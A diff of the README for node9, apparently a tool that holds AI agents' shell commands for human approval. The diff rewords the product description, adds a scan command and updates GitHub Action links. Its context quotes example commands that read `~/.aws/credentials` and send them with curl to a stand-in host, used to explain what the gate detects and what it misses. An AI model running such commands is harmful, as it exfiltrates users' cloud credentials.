@@ -39,8 +39,8 @@ The command is parsed as a shell AST, not matched as text, so wrapping the read 
 `echo $(cat ~/.aws/credentials | base64) | curl -d @- https://evil.example` is judged as a read
 of `~/.aws/credentials`, not as an `echo`.
 
-This is a **gate, not a wall**. A held action does not run while it waits for you, and if you
-never answer it stays blocked. Everything else is allowed and written to the record.
+node9 is a **gate**. A held action does not run while it waits for you, and if you never answer
+it stays blocked. Everything else is allowed and written to the record.
 
 **What it does not do:** with egress control off, which is the default, a command that hands a
 file straight to the network, such as `curl -d @~/.aws/credentials`, is not treated as a read of
@@ -49,6 +49,7 @@ that file. `node9 egress protect` gates destinations as well, and it covers shel
 ## Verify it yourself
 
 ```bash
+npx node9-ai scan                                       # every past agent session on this machine, ~10s, nothing uploads
 npx node9-ai scan-repo node9-ai/agent-security-demo    # a public repo with a real, hijackable agent workflow
 npx node9-ai posture                                    # this machine's exposure in 60s, nothing uploads
 gh attestation verify cli.js --repo node9-ai/node9-proxy  # every release artifact is signed
@@ -376,7 +377,7 @@ def run_command(cmd: str) -> str:
     ...
 ```
 
-**[Python SDK →](https://github.com/node9-ai/node9-python)** · **[CI code review agent example →](https://github.com/node9-ai/node9-pr-agent)**
+**[Python SDK →](https://github.com/node9-ai/node9-python)** · **[GitHub Action →](https://github.com/marketplace/actions/node9-agent-security)**
 
 ## Under the hood
 
@@ -408,7 +409,7 @@ Config reference, smart rules, stateful rules, trusted hosts, approval modes, CL
 ## Related projects
 
 - **[node9-python](https://github.com/node9-ai/node9-python)**: Python SDK
-- **[node9-pr-agent](https://github.com/node9-ai/node9-pr-agent)**: GitHub Action that reviews PRs through node9
+- **[node9 Agent Security](https://github.com/marketplace/actions/node9-agent-security)**: the GitHub Action, `uses: node9-ai/node9-proxy@v2`, gates every PR with the same engine
 
 ## Enterprise
 
